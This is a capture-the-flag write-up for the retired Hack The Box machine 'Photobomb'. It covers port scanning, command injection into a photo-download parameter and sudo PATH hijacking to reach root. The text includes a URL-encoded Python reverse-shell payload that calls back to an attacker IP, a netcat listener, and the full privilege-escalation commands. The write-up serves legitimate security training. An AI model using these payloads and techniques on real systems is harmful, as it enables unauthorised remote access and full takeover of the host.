# Photobomb
Machine Name: Photobomb
-----------------------

*   **Status:** Retired
*   **OS:** Linux
*   **Difficulty:** Easy
*   **Date Owned:** 11/23/2022 
*   **IP Assigned:** 10.10.11.182

Enumeration:
------------

First I'll fire off an NMAP scan to look for any open ports on the target using the following switches:

*   \-sS: syn scan, this is quick and stealthy as it does not complete the TCP connection. It can also differentiation between open, closed, and filtered states of a port. I will need to be run with sudo privileges as it requires raw packet manipulation.
*   \-A: enables aggressive scanning and will enable OS detection (-O), version scanning (-sV), script scanning (-sC), and traceroute (-traceroute).
*   \-p-: will scan all ports on the host.
*   \-T4: timing template 4 is a predefined packet limit per millisecond. Template 4 is considered aggressive.
*   \-oN: output the results to a file.

```text-plain
sudo nmap -sS -A -p- -T4 -oN nmap.txt 10.10.11.182
[sudo] password for kali: 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-21 22:54 EST
Nmap scan report for 10.10.11.182
Host is up (0.022s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e2:24:73:bb:fb:df:5c:b5:20:b6:68:76:74:8a:b5:8d (RSA)
|   256 04:e3:ac:6e:18:4e:1b:7e:ff:ac:4f:e3:9d:d2:1b:ae (ECDSA)
|_  256 20:e0:5d:8c:ba:71:f0:8c:3a:18:19:f2:40:11:d2:9e (ED25519)
80/tcp open  http   nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://photobomb.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=11/21%OT=22%CT=1%CU=34522%PV=Y%DS=2%DC=T%G=Y%TM=637C48
OS:08%P=x86_64-pc-linux-gnu)SEQ(SP=F8%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M539ST11NW7%O2=M539ST11NW7%O3=M539NNT11NW7%O4=M539ST11NW7%O5=M539ST1
OS:1NW7%O6=M539ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN
OS:(R=Y%DF=Y%T=40%W=FAF0%O=M539NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 5900/tcp)
HOP RTT      ADDRESS
1   22.25 ms 10.10.14.1
2   22.30 ms 10.10.11.182

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.16 seconds
```

After a few minutes the scan has completed. Ports 22 (SSH) and 80 (HTTP) appear to be open.

Web Enumeration:
----------------

We'll start by adding the domain to our hosts file then browse to the webpage.

```text-plain
echo ‘10.10.11.182 photobomb.htb’ | sudo tee -a /etc/hosts
```

The webpage does not seem to offer much but it seems a note has been left by an administrator in a javascript file which can be viewed in the debugger tab.

![](Photobomb/image.png)

if we navigate to the page in the note we find some functionality that allows a user to download a photo from the web server. Lets fire up Burp Suite and intercept this traffic.

Burp Suite Command Injection
----------------------------

Click on the Proxy tab in Burp Suite and click Open Browser. Paste in the URL we found in the dev comment above. Now select the ‘Intercept is off’ button which will flip it to on. With intercept on click on the download button at the bottom of the webpage to capture the request which will look like the image below.

![](Photobomb/1_image.png)

Lets try to inject some code into one of these parameters and try to execute a reverse shell. I will use the python payload below. You will need to replace the ‘x’ characters with your IP, and specify a port you will be listening on.

```text-plain
;export+RHOST="xx.xx.xx.xx";export+RPORT=4444;python3+-c+'import+sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd)+for+fd+in+(0,1,2)];pty.spawn("sh")'
```

With the payload ready start a netcat listener on the port specified.

```text-plain
nc -nlvp 4444
listening on [any] 4444 ...
```

Now that the payload is prepared and we are listening for a connection on the appropriate port go back to Burp Suite, right click anywhere in the request we intercepted earlier and select ‘Send to Repeater’. Then go to the Repeater tab which should be highlighted and paste the URL encoded payload into the filetype parameter. The response should hang which is always a promising sign, then we see a new connection appear on our listener which means we got a shell!

![](Photobomb/2_image.png)

Reverse Shell Access
--------------------

Now we have access to the machine under the account or service that executed our code. Lets do a bit of enumeration to find out who we are and find the flag. The flag is located at /home/wizard/user.txt

```text-plain
nc -nlvp 4444
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.11.182.
Ncat: Connection from 10.10.11.182:41316.
$ id
id
uid=1000(wizard) gid=1000(wizard) groups=1000(wizard)
$ cat /home/wizard/user.txt
cat /home/wizard/user.txt
HTB{********************************}
 
```

Privilege Escalation
--------------------

Next we will need to find a path to privilege escalation. One of the first things to check is the owned account's permissions for anything unusual. We'll start with the sudo -l command.

```text-plain
$ sudo -l
sudo -l
Matching Defaults entries for wizard on photobomb:
   env_reset, mail_badpass,
   secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
User wizard may run the following commands on photobomb:
   (root) SETENV: NOPASSWD: /opt/cleanup.sh
```

It seems that we can ser environmental variables (SETENV) and also run this bash script called cleanup.sh as root. Lets take a look at the code in cleanup.sh and see if we can leverage it to execute a payload as root.

```text-plain
$ cat /opt/cleanup.sh
cat /opt/cleanup.sh
#!/bin/bash
. /opt/.bashrc
cd /home/wizard/photobomb
# clean up log files
if [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]
then
 /bin/cat log/photobomb.log > log/photobomb.log.old
 /usr/bin/truncate -s0 log/photobomb.log
fi
# protect the priceless originals
find source_images -type f -name '*.jpg' -exec chown root:root {} \;
```

Notice that ‘find’ is being called without specifying its absolute path. Knowing that we can set environmental variables might mean that we can create a malicious version of find and force cleanup.sh to execute our find function instead by modifying the PATH variable.

In order to do this we will need to navigate back to our home directory where we have write permissions and create a new find file that contains bash. Then we will need to add execute permission, and finally add this directory to the beginning of the PATH variable for cleanup.sh.

```text-plain
$ cd /home/wizard
cd /home/wizard
$ ls
ls
photobomb  user.txt
$ echo bash > find
echo bash > find
$ chmod +x find
chmod +x find
$ sudo PATH=$PWD:$PATH /opt/cleanup.sh
sudo PATH=$PWD:$PATH /opt/cleanup.sh
```

Root Shell Access
-----------------

Once the path is added and the script is executed we now have a root shell. The root flag can be found at /root/root.txt

```text-plain
root@photobomb:/home/wizard/photobomb# id    
id
uid=0(root) gid=0(root) groups=0(root)
root@photobomb:/home/wizard/photobomb# cat /root/root.txt
cat /root/root.txt
HTB{********************************}
```

Congratulations on completing this machine! Happy hunting.